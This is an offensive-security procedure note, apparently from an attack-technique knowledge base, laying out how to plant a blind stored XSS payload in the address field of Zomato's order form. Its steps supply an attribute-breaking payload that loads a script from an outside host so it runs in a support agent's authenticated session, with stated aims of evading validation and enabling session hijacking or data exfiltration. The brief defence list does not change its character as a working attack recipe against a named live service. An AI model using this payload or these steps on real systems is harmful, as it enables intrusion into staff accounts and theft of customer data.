---
tags:
  - xss
  - injection
  - payload
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.914Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 892b7f16-02fa-46a6-bd94-8d5238a4eb2a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Blind-Stored-XSS-Payload-into-Order-Form

## Summary

This procedure demonstrates how to inject a blind stored XSS payload into the address field of Zomato's order placement form, leveraging insufficient input sanitization to store malicious JavaScript that executes later in an admin context.

## Description

In a typical e-commerce scenario like Zomato, user-supplied data in order fields is stored and rendered in admin dashboards without proper escaping. An attacker places an order with a crafted payload in the address field, which is saved to the database. When a support agent views the order, the payload executes in their authenticated session, potentially allowing session hijacking or data exfiltration. This is a blind XSS as the attacker cannot see immediate effects but uses tracking tools to confirm.

## Requirements

1. Access to Zomato as a registered user (free account)
2. [[tools/XSS-Hunter]] account for payload generation and monitoring
3. Valid payment method or test order capability (if required by the platform)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., HTML entity escaping) for all user inputs in admin views
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript payloads in logs and employ WAF rules for XSS patterns

## Objectives

1. Store malicious JavaScript in the backend database via the order form
2. Ensure payload evades client-side validation
3. Set up tracking for later confirmation of execution

## Instructions

### Step 1: Generate Payload with XSS Hunter

**Context**: Create a unique, trackable XSS payload to detect blind execution without relying on visible alerts.

Use [[tools/XSS-Hunter]] to generate the payload:

Navigate to XSS Hunter dashboard and create a new hunt. Copy the provided script tag, e.g., `<script src="https://xsshunter.com/payload?id=uniqueid"></script>`.

### Step 2: Place Order with Injected Payload

**Context**: Inject the payload into the address field during order placement to store it server-side.

Log in to Zomato, select an item, and proceed to checkout. In the address field, enter a valid address followed by the payload:

`123 Main St, City"><script src="https://xsshunter.com/payload?id=uniqueid"></script>`

Complete the order submission.

> This breaks out of the input context (e.g., from a value attribute) and injects the script tag, which is stored raw.

### Step 3: Verify Storage

**Context**: Confirm the order was placed without rejection, indicating successful storage.

Check order history for confirmation. No immediate execution occurs, confirming blind nature.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- xss
- injection
